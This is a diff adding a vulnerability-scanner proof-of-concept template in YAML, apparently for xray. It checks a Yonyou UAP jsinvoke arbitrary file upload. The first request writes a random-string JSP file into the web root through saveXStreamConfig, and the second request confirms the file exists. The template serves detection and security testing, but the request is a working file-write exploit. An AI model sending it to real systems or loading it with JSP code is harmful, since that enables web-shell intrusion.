@@ -1,0 +1,27 @@
+name: poc-yaml-yonyou-uapjs-file-upload
+transport: http
+set:
+  filename: randomLowercase(6)
+  file_content: randomLowercase(10)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /uapjs/jsinvoke?action=invoke
+      follow_redirects: false
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: >-
+        {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["{{file_content}}","webapps/nc_web/{{filename}}.jsp"]}
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /{{filename}}.jsp
+      follow_redirects: false
+    expression: response.status == 200 && response.body_string.contains(file_content)
+expression: r0() && r1()
+detail:
+  author: Secur1ty0(https://github.com/Secur1ty0)
+  links:
+    - https://mp.weixin.qq.com/s/OO6GIKWm9ld05Vc2WQhkRg
